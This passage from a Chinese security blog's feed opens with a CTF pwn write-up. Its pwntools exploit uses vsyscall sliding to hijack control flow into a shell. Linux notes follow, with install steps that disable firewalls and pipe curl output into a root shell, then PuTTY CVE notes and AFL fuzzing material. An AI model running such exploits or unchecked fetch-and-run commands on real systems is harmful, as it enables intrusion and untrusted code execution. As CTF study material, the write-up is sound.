      <url>2020/09/19/DASCTF8%E6%9C%88%E8%B5%9B%EF%BC%9Amagic-number/</url>
      
        <content type="html"><![CDATA[<p>题目中给出现成的调用<code>system(&quot;/bin/sh&quot;);</code>的执行地址，且存在栈上面的缓冲区溢出漏洞，不过因为程序开启了PIE（地址随机化），所以不能直接的用IDA中显示的地址覆盖。</p><p><img src="/2020/09/19/DASCTF8%E6%9C%88%E8%B5%9B%EF%BC%9Amagic-number/image-20200919235944186.png" alt="image-20200919235944186"></p><p>不过地址随机化了，但最后一个字节的地址还是一致的，这里可以利用<code>vsyscall</code>来进行滑动，在内存中找到合适的地址来利用就可以了。<code>vsyscall</code>是无参数的调用，就相当于一个ROP gadget, 可利用的三个地址为：0xffffffffff600000, 0xffffffffff600400, 0xffffffffff600800。</p><p>仔细调试程序，发现在栈上存在一个可利用的地址，即<code>__libc_start_main</code>传参的时候把main函数的地址放到了栈上，而main函数的地址和<code>system(&quot;/bin/sh&quot;);</code>的地址就只有最后一个字节不一样，所以就可以利用了。</p><p><img src="/2020/09/19/DASCTF8%E6%9C%88%E8%B5%9B%EF%BC%9Amagic-number/image-20200920001344963.png" alt="image-20200920001344963"></p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">p=process(<span class="string">&#x27;magic_number&#x27;</span>)</span><br><span class="line"><span class="comment">#p=remote(&#x27;183.129.189.60&#x27;,10010)</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;magic_number&#x27;</span>)</span><br><span class="line"><span class="comment"># sleep(5)</span></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">payload = <span class="string">&#x27;B&#x27;</span>*<span class="number">0x38</span>+p64(<span class="number">0xFFFFFFFFFF600000</span>)+p64(<span class="number">0xFFFFFFFFFF600000</span>)+p64(<span class="number">0xFFFFFFFFFF600000</span>)+p64(<span class="number">0xFFFFFFFFFF600000</span>)+<span class="string">&#x27;\xA8&#x27;</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;Your Input :\n&quot;</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>本地测试如下：</p><p><img src="/2020/09/19/DASCTF8%E6%9C%88%E8%B5%9B%EF%BC%9Amagic-number/image-20200920002301586.png" alt="image-20200920002301586"></p>]]></content>
      
      
      <categories>
          
          <category> Writeups </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> vsyscall利用 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux常用命令（更新）</title>
      <link href="2020/06/24/Linux%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%EF%BC%88%E6%9B%B4%E6%96%B0%EF%BC%89/"/>
      <url>2020/06/24/Linux%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%EF%BC%88%E6%9B%B4%E6%96%B0%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<p>今天重新登上了自己的服务器，发现好多操作的命令都忘了，因此这里需要记录一下，后面也会补充吧。</p><h3 id="1-用户相关的命令"><a href="#1-用户相关的命令" class="headerlink" title="1. 用户相关的命令"></a>1. 用户相关的命令</h3><p>创建用户：<code>adduser username</code>,创建一个用户，也会在home目录下创建相应的目录；<code>useradd username</code>,只是创建了一个用户名，可以添加<code>-m</code>参数实现创建home下的目录。</p><p>修改密码：<code>passwd username</code>.</p><p>删除用户：<code>userdel -r username</code>.</p><p>为创建的用户赋予管理员权限：添加<code>/etc/sudoers.d/username</code>文件，添加相应用户，例如<code>username ALL=(ALL) ALL</code>。如果是修改<code>/etc/passwd</code>中相应用户的用户ID的话，登录会直接以ROOT登录，修改sudoers文件相应给到用户的权限会安全一点。</p><h3 id="2-ssh和service"><a href="#2-ssh和service" class="headerlink" title="2. ssh和service"></a>2. ssh和service</h3><p>修改ssh连接端口：找到<code>/etc/ssh/sshd_config</code>文件，找到相应的行修改端口就行。</p><p>修改source.list文件：<code>sudo vi /etc/apt/sources.list</code>,添加相应的代理，最好先将原来的文件备份一个。</p><p>查看服务开启状态：<code>sudo service --status-all</code>.</p><h3 id="3-安装v2ray"><a href="#3-安装v2ray" class="headerlink" title="3. 安装v2ray"></a>3. 安装v2ray</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#! /bin/bash</span></span><br><span class="line"><span class="comment"># Copyright (c) 2018 flyzy小站</span></span><br><span class="line"></span><br><span class="line">red=<span class="string">&#x27;\033[0;31m&#x27;</span></span><br><span class="line">green=<span class="string">&#x27;\033[0;32m&#x27;</span></span><br><span class="line">yellow=<span class="string">&#x27;\033[0;33m&#x27;</span></span><br><span class="line">plain=<span class="string">&#x27;\033[0m&#x27;</span></span><br><span class="line"></span><br><span class="line">os=<span class="string">&#x27;ossystem&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">check_os</span></span>() &#123;</span><br><span class="line">    <span class="keyword">if</span> [[ -f /etc/redhat-release ]]; <span class="keyword">then</span></span><br><span class="line">        os=<span class="string">&quot;centos&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> cat /etc/issue | grep -Eqi <span class="string">&quot;debian&quot;</span>; <span class="keyword">then</span></span><br><span class="line">        os=<span class="string">&quot;debian&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> cat /etc/issue | grep -Eqi <span class="string">&quot;ubuntu&quot;</span>; <span class="keyword">then</span></span><br><span class="line">        os=<span class="string">&quot;ubuntu&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> cat /etc/issue | grep -Eqi <span class="string">&quot;centos|red hat|redhat&quot;</span>; <span class="keyword">then</span></span><br><span class="line">        os=<span class="string">&quot;centos&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> cat /proc/version | grep -Eqi <span class="string">&quot;debian&quot;</span>; <span class="keyword">then</span></span><br><span class="line">        os=<span class="string">&quot;debian&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> cat /proc/version | grep -Eqi <span class="string">&quot;ubuntu&quot;</span>; <span class="keyword">then</span></span><br><span class="line">        os=<span class="string">&quot;ubuntu&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> cat /proc/version | grep -Eqi <span class="string">&quot;centos|red hat|redhat&quot;</span>; <span class="keyword">then</span></span><br><span class="line">        os=<span class="string">&quot;centos&quot;</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">getversion</span></span>()&#123;</span><br><span class="line">    <span class="keyword">if</span> [[ -s /etc/redhat-release ]]; <span class="keyword">then</span></span><br><span class="line">        grep -oE  <span class="string">&quot;[0-9.]+&quot;</span> /etc/redhat-release</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        grep -oE  <span class="string">&quot;[0-9.]+&quot;</span> /etc/issue</span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">centosversion</span></span>()&#123;</span><br><span class="line">    <span class="keyword">if</span> [ <span class="variable">$&#123;os&#125;</span> == <span class="string">&#x27;centos&#x27;</span> ]</span><br><span class="line">    <span class="keyword">then</span></span><br><span class="line">        <span class="built_in">local</span> code=<span class="variable">$1</span></span><br><span class="line">        <span class="built_in">local</span> version=<span class="string">&quot;<span class="subst">$(getversion)</span>&quot;</span></span><br><span class="line">        <span class="built_in">local</span> main_ver=<span class="variable">$&#123;version%%.*&#125;</span></span><br><span class="line">        <span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$main_ver</span>&quot;</span> == <span class="string">&quot;<span class="variable">$code</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">            <span class="built_in">return</span> 0</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="built_in">return</span> 1</span><br><span class="line">        <span class="keyword">fi</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">return</span> 1</span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">firewall_set</span></span>() &#123;</span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;[<span class="variable">$&#123;green&#125;</span>信息<span class="variable">$&#123;plain&#125;</span>] 正在设置防火墙...&quot;</span></span><br><span class="line"><span class="keyword">if</span> centosversion 6; <span class="keyword">then</span></span><br><span class="line">/etc/init.d/iptables status &gt; /dev/null 2&gt;&amp;1</span><br><span class="line"><span class="keyword">if</span> [ $? -eq 0 ]; <span class="keyword">then</span></span><br><span class="line">chkconfig iptables off</span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;[<span class="variable">$&#123;green&#125;</span>信息<span class="variable">$&#123;plain&#125;</span>] 防火墙已经关闭。&quot;</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;[<span class="variable">$&#123;yellow&#125;</span>警告<span class="variable">$&#123;plain&#125;</span>] 防火墙（iptables）好像已经停止或没有安装，如有需要请手动关闭防火墙。&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="keyword">elif</span> centosversion 7; <span class="keyword">then</span></span><br><span class="line">systemctl status firewalld &gt; /dev/null 2&gt;&amp;1</span><br><span class="line"><span class="keyword">if</span> [ $? -eq 0 ]; <span class="keyword">then</span></span><br><span class="line">systemctl stop firewalld.service</span><br><span class="line">systemctl <span class="built_in">disable</span> firewalld.service</span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;[<span class="variable">$&#123;green&#125;</span>信息<span class="variable">$&#123;plain&#125;</span>] 防火墙已经关闭。&quot;</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;[<span class="variable">$&#123;yellow&#125;</span>警告<span class="variable">$&#123;plain&#125;</span>] 防火墙（iptables）好像已经停止或没有安装，如有需要请手动关闭防火墙。&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;[<span class="variable">$&#123;green&#125;</span>信息<span class="variable">$&#123;plain&#125;</span>] 防火墙设置成功。&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">main</span></span>() &#123;</span><br><span class="line">check_os</span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$&#123;os&#125;</span> == <span class="string">&#x27;centos&#x27;</span> ]</span><br><span class="line">        <span class="keyword">then</span></span><br><span class="line">                firewall_set</span><br><span class="line">        <span class="keyword">fi</span></span><br><span class="line">bash &lt;(curl -L -s https://install.direct/go.sh)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$EUID</span>&quot;</span> -ne 0 ]; <span class="keyword">then</span></span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;[<span class="variable">$&#123;red&#125;</span>错误<span class="variable">$&#123;plain&#125;</span>] 必需以root身份运行，请使用sudo命令&quot;</span></span><br><span class="line"><span class="built_in">exit</span> 1;</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">main</span><br></pre></td></tr></table></figure><h3 id="4-改变终端前缀提示"><a href="#4-改变终端前缀提示" class="headerlink" title="4. 改变终端前缀提示"></a>4. 改变终端前缀提示</h3><p>在<code>~/.bashrc</code>文件中添加<code>export PROMPT_COMMAND=&#39;echo Hello,Spwpun&#39;</code>类似这样的语句，在终端前面就会显示提示信息。</p><p><img src="/2020/06/24/Linux%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%EF%BC%88%E6%9B%B4%E6%96%B0%EF%BC%89/image-20200920003523225.png" alt="image-20200920003523225"></p><h3 id="5-tmux"><a href="#5-tmux" class="headerlink" title="5. tmux"></a>5. tmux</h3><p>tmux是一个终端复用器，开启的一个终端叫做一个session，一个session可以开启多个window，可以开启多个终端来执行AFL的并行模式。</p><p><code>tmux ls</code>: 查看已有会话。</p><p><code>tmux new -s &lt;session-name&gt;</code>：新建会话。</p><p><code>tmux attach -t &lt;session-name&gt;</code>：接入会话。</p><p><code>tmux kill-session -t &lt;session-name&gt;</code>：删除会话。</p><p>tmux有大量快捷键，不过需要前缀键才能使用，默认的前缀键是<code>Ctrl+B</code>。</p><p>按完前缀键后：s（列出会话）、d（退出会话）、$（重命名当前会话）</p><h3 id="6-安装vulhub漏洞靶场"><a href="#6-安装vulhub漏洞靶场" class="headerlink" title="6. 安装vulhub漏洞靶场"></a>6. 安装vulhub漏洞靶场</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">curl -s https://get.docker.com/ | sh</span><br><span class="line">pip install docker-compose</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/vulhub/vulhub.git</span><br><span class="line"><span class="built_in">cd</span> /path/to/vuln/</span><br><span class="line">docker-compose build <span class="comment"># 编译</span></span><br><span class="line">docker-compose up -d <span class="comment"># 启动环境</span></span><br><span class="line">docker-compose down <span class="comment"># 停止环境</span></span><br></pre></td></tr></table></figure><h3 id="7-永久添加环境变量"><a href="#7-永久添加环境变量" class="headerlink" title="7. 永久添加环境变量"></a>7. 永久添加环境变量</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo vim /etc/profile</span><br><span class="line"><span class="comment"># 在最后一行添加：</span></span><br><span class="line"><span class="built_in">export</span> PATH=<span class="string">&quot;/home/spwpun/.local/bin:<span class="variable">$PATH</span>&quot;</span></span><br><span class="line"><span class="comment"># 退出后使用source命令生效</span></span><br><span class="line"><span class="built_in">source</span> /etc/profile</span><br></pre></td></tr></table></figure><h3 id="8-查看一个目录下各个文件的大小"><a href="#8-查看一个目录下各个文件的大小" class="headerlink" title="8. 查看一个目录下各个文件的大小"></a>8. 查看一个目录下各个文件的大小</h3><p><code>du -h --max-depth=1 /var/lib/docker</code></p><h3 id="9-docker与主机之间复制文件"><a href="#9-docker与主机之间复制文件" class="headerlink" title="9. docker与主机之间复制文件"></a>9. docker与主机之间复制文件</h3><p><code>sudo  docker ps -a</code>，查看docker的所有容器实例，包含运行的和停止的</p><p><code>sudo docker cp host_path containerID:container_path</code></p><p><code>sudo docker cp containerID:container_path host_path</code></p><h3 id="10-docker启动容器命令"><a href="#10-docker启动容器命令" class="headerlink" title="10. docker启动容器命令"></a>10. docker启动容器命令</h3><p><code>sudo docker run -i(image) -t(tag) Ubuntu:16.04 &quot;/bin/bash&quot;</code>，不输入tag的时候会自动设为<code>latest</code>.</p><h3 id="11-docker容器重命名"><a href="#11-docker容器重命名" class="headerlink" title="11. docker容器重命名"></a>11. docker容器重命名</h3><p><code>docker rename [旧容器名] [新容器名]</code></p><p>docker中的容器和镜像是两个概念，适当看一下是否创建了很多无用的容器，那样会很占内存的。</p><h3 id="12"><a href="#12" class="headerlink" title="12."></a>12.</h3>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 备忘 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>putty CVE-2017-6542复现</title>
      <link href="2020/06/18/putty-CVE-2017-6542%E5%A4%8D%E7%8E%B0/"/>
      <url>2020/06/18/putty-CVE-2017-6542%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h3 id="序"><a href="#序" class="headerlink" title="序"></a>序</h3><p>第一次分析这样的漏洞吧，尽可能写得详细一点。Putty是一个开源软件，通常用于Unix系统的SSH连接工具，其官方网站为：<a href="https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html%E3%80%82%E4%B9%8B%E5%89%8D%E5%9C%A8%E6%90%AD%E5%BB%BA%E8%87%AA%E5%B7%B1%E7%9A%84%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%9A%84%E6%97%B6%E5%80%99%E5%B0%B1%E4%BD%BF%E7%94%A8%E8%BF%87%EF%BC%8C%E4%B8%8D%E8%BF%87%E5%9B%A0%E4%B8%BA%E4%B8%8D%E5%A4%AA%E7%A8%B3%E5%AE%9A%E5%B0%B1%E6%8D%A2%E6%88%90xshell%E4%BA%86%E3%80%82">https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html。之前在搭建自己的服务器的时候就使用过，不过因为不太稳定就换成xshell了。</a></p><h3 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>PuTTY 0.68之前的<code>ssh_agent_channel_data</code>函数中存在一个heap-corrupting integer overflow漏洞，使得攻击者可以通过构造特殊数据使得PuTTY崩溃或者远程代码执行。</p><h3 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h3><ul><li>PuTTY 0.67</li><li>Linux 虚拟机，开启ssh服务，安装socat。</li></ul><h3 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h3><p>开启PuTTY的ssh agent fowarding：</p><p><img src="/2020/06/18/putty-CVE-2017-6542%E5%A4%8D%E7%8E%B0/image-20200714011006104.png" alt="image-20200714011006104"></p><center>图1：Allow agent forwarding</center>]]></content>
      
      
      <categories>
          
          <category> 漏洞挖掘 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CVE-2017-6542 </tag>
            
            <tag> putty </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>afl testcase zero</title>
      <link href="2020/06/17/afl-testcase-zero/"/>
      <url>2020/06/17/afl-testcase-zero/</url>
      
        <content type="html"><![CDATA[<h3 id="Pre"><a href="#Pre" class="headerlink" title="Pre"></a>Pre</h3><p>使用AFL先跑其自带的测试用例。</p><h3 id="Start"><a href="#Start" class="headerlink" title="Start"></a>Start</h3><p>安装好的AFL目录如下图所示：</p><p><img src="/2020/06/17/afl-testcase-zero/image-20200617155420427.png" alt="image-20200617155420427"></p><p>其中的test-instr.c就是测试所用的示例。</p><p>需要将其再编译生成插桩后的二进制文件，新建一个test目录，再在里面新建test_in,test_out两个目录，将测试文件复制到该文件夹中，新建一个简单的makefile文件，如下：</p><p><img src="/2020/06/17/afl-testcase-zero/image-20200617155850996.png" alt="image-20200617155850996"></p><p><img src="/2020/06/17/afl-testcase-zero/image-20200617160014747.png" alt="image-20200617160014747"></p><p>然后make编译就能生成二进制插桩后的文件了，一般出现一个提示”core_pattern“的设置错误，这里的话需要设置一下状态：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ sudo su</span><br><span class="line">$ <span class="built_in">echo</span> core &gt; /proc/sys/kernel/core_pattern</span><br></pre></td></tr></table></figure><p>然后就可以正常跑了，一般执行命令<code>afl-fuzz</code>,可以参阅上一篇文章。</p><p>我从中午一直跑到了晚上，也没有发现crash的情况出现，结果在freebuf的一篇文章看到如果“cycles done”的字段颜色为绿色就代表再跑下去也没什么结果了，afl运行的过程一直是个死循环，所以才会一直在跑。</p><p><img src="/2020/06/17/afl-testcase-zero/image-20200618010657790.png" alt="image-20200618010657790"></p><p>然后我就强行停止了。</p><h3 id="Again"><a href="#Again" class="headerlink" title="Again"></a>Again</h3><p>很奇怪的是这是afl自带的测试用例，按道理不应该跑不出来的。于是我又去找了一下社区内前辈的文章来看，借用了其中的一个示例代码，结果就很快跑出该程序的crash情况了。</p><p><img src="/2020/06/17/afl-testcase-zero/image-20200618012545922.png" alt="image-20200618012545922"></p><p>我特意把两次的输出目录都分开了，两次跑的结果都存在，至于如何分析输出的情况，接下来会继续。</p>]]></content>
      
      
      <categories>
          
          <category> 工具使用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Fuzz </tag>
            
            <tag> testcase </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>afl readme</title>
      <link href="2020/06/15/afl-readme/"/>
      <url>2020/06/15/afl-readme/</url>
      
        <content type="html"><![CDATA[<p>原文地址：<a href="https://lcamtuf.coredump.cx/afl/README.txt">https://lcamtuf.coredump.cx/afl/README.txt</a></p><h3 id="American-fuzzy-lop"><a href="#American-fuzzy-lop" class="headerlink" title="American fuzzy lop"></a>American fuzzy lop</h3><p>简称AFL，是当下最常用的模糊测试工具，而模糊测试主要用于漏洞挖掘。</p><p>由Michal Zalewski <a href="mailto:&#108;&#x63;&#x61;&#x6d;&#116;&#117;&#102;&#x40;&#x67;&#111;&#111;&#103;&#x6c;&#101;&#x2e;&#x63;&#111;&#x6d;">&#108;&#x63;&#x61;&#x6d;&#116;&#117;&#102;&#x40;&#x67;&#111;&#111;&#103;&#x6c;&#101;&#x2e;&#x63;&#111;&#x6d;</a>编写和维护</p><p>新版本和更多信息请查阅：<a href="http://lcamtuf.coredump.cx/afl/">http://lcamtuf.coredump.cx/afl/</a></p><p>如果你想获得其他用户的使用笔记或者主要新功能的通知，可以通过电子邮件：<a href="mailto:&#97;&#102;&#x6c;&#45;&#x75;&#115;&#101;&#x72;&#115;&#43;&#x73;&#117;&#98;&#115;&#99;&#x72;&#105;&#98;&#101;&#64;&#x67;&#111;&#111;&#x67;&#x6c;&#x65;&#103;&#114;&#x6f;&#117;&#112;&#x73;&#46;&#x63;&#111;&#109;">&#97;&#102;&#x6c;&#45;&#x75;&#115;&#101;&#x72;&#115;&#43;&#x73;&#117;&#98;&#115;&#99;&#x72;&#105;&#98;&#101;&#64;&#x67;&#111;&#111;&#x67;&#x6c;&#x65;&#103;&#114;&#x6f;&#117;&#112;&#x73;&#46;&#x63;&#111;&#109;</a></p><p>如果你没有时间读完这篇文章，可先查阅”QuickStartGuide.txt”。</p><h3 id="1）引导性模糊测试的难点"><a href="#1）引导性模糊测试的难点" class="headerlink" title="1）引导性模糊测试的难点"></a>1）引导性模糊测试的难点</h3><p>Fuzzing是在现实软件中识别安全问题的最强大和被证明的策略之一;到目前为止，在安全关键型软件中发现的绝大多数远程代码执行和提权漏洞都是由它发现的。</p><p>不幸的是，fuzzing也相对较浅;盲目的、随机的突变使得它不太可能到达测试代码中的某些代码路径，从而使一些漏洞牢牢地超出了这种技术的范围。</p><p>为解决这个问题已作了许多尝试。早期的方法之一——由塔维斯·奥曼蒂开创——是体蒸馏。该方法依靠覆盖信号从大量高质量的候选文件语料库中选择感兴趣的种子子集，然后用传统方法对其进行模糊处理。这种方法非常有效，但需要这样的语料库随时可用。此外，块覆盖度量只提供了对程序状态的一个非常简单的理解，并且在指导长期的模糊工作方面用处不大。</p><p>其他更复杂的研究集中在诸如程序流分析(“协同执行”)、符号执行或静态分析等技术上。所有这些方法在实验环境中都非常有前途，但在实际应用中往往存在可靠性和性能问题——而且目前还不能提供“愚蠢的”模糊技术（指模糊测试的盲目性）的可行替代方案。</p><h3 id="2）afl-fuzz方法"><a href="#2）afl-fuzz方法" class="headerlink" title="2）afl-fuzz方法"></a>2）afl-fuzz方法</h3><p>AFL是一个蛮力的Fuzzer，它的插桩引导遗传算法极其简单但却很可靠。它使用了一种改进的边缘覆盖形式来捕捉程序控制流中细微的、局部的变化。稍微简化一下，整体算法可总结为：</p><blockquote><ol><li>将用户提供的测试用例加载到队列中</li><li>从队列中获取下一个输入文件</li><li>尝试将测试用例修剪到最小的不会影响程序的测量行为的大小</li><li>使用平衡且经过充分研究的各种传统模糊策略反复修改文件</li><li>如果生成的任何突变导致插装记录的新状态转换，则在队列中添加突变的输出作为新条目</li><li>返回第2步。</li></ol></blockquote><p>被发现的测试用例也被周期性地剔除，以消除那些被更新的、高覆盖率的发现所淘汰的用例;并继续执行其他几个由工具驱动的工作最小化步骤。</p><p>作为模糊处理过程的一个副产品，该工具创建了有趣的测试用例的小型自包含语料库。这对于推广其他劳动或资源密集型的测试机制非常有用——例如，用于压力测试浏览器、办公应用程序、图形套件或闭源工具。</p><p>这个Fuzzer经过了全面的测试，提供了开箱即用的功能，这远优于盲目的fuzzing或仅覆盖工具（coverage-only）。</p><h3 id="3）用于AFL的插桩程序"><a href="#3）用于AFL的插桩程序" class="headerlink" title="3）用于AFL的插桩程序"></a>3）用于AFL的插桩程序</h3><p>当源代码可用时，可以通过一个伴生工具注入插装，该工具在任何标准的第三方代码构建过程中作为gcc或clang的临时替代品。</p><p>插装对性能的影响相当小;与afl-fuzz实现的其他优化相结合，大多数程序可以像使用传统工具一样快速甚至更快地进行模糊处理。</p><p>重新编译目标程序的正确方法可能会因构建过程的具体情况而有所不同，但是一种几乎通用的方法是：</p><blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ CC=/path/to/afl/afl-gcc ./configure</span><br><span class="line">$ make clean all</span><br></pre></td></tr></table></figure></blockquote><p>对于C ++程序，您还需要设置:<code>CXX=/path/to/afl/afl-g++</code>.</p><p>可以使用相同的方式使用clang包装器（afl-clang和afl-clang ++）。Clang用户也可能会选择使用更高性能的检测模式，如<code>llvm_mode/README.llvm</code>中所述。</p><p>在测试库时，需要找到或编写一个简单的程序，从stdin或文件中读取数据，并将其传递给测试库。在这种情况下，必须将此可执行文件链接到检测库的静态版本，或者确保在运行时加载正确的so文件(通常通过设置LD_LIBRARY_PATH)。最简单的选择是静态构建，通常可以通过:</p><blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ CC=/path/to/afl/afl-gcc ./configure --disable-shared</span><br></pre></td></tr></table></figure></blockquote><p>在调用“ make”时设置AFL_HARDEN = 1将导致CC包装器自动启用代码强化选项，使其更易于检测简单的内存错误。 Libdislocator，一个AFL附带的帮助程序库（请参阅libdislocator / README.dislocator）也可以帮助发现堆损坏问题。</p><p>注：建议ASAN用户查看ASAN.txt文件的注释，以了解重要的警告。</p><h3 id="4）二进制程序插桩"><a href="#4）二进制程序插桩" class="headerlink" title="4）二进制程序插桩"></a>4）二进制程序插桩</h3><p>当源代码不可用时，AFL为黑盒二进制文件提供了快速、动态插桩的实验性支持。这是通过一个运行在更少人知道的用户模拟空间的QEMU版本来实现的。</p><p>QEMU是一个独立于AFL的项目，但是您可以通过以下操作方便地构建该特性：</p><blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> qemu_mode</span><br><span class="line">$ ./build_qemu_support.sh</span><br></pre></td></tr></table></figure></blockquote><p><img src="/2020/06/15/afl-readme/image-20200615201618394.png" alt="image-20200615201618394"></p><p>额外的命令和注意事项，请查阅：<code>qemu_mode/README.qemu</code>.</p><p>这种模式比编译时插桩慢2-5倍，不利于并行化，而且可能还有其他一些奇怪之处。</p><h3 id="5）选择初始化测试用例"><a href="#5）选择初始化测试用例" class="headerlink" 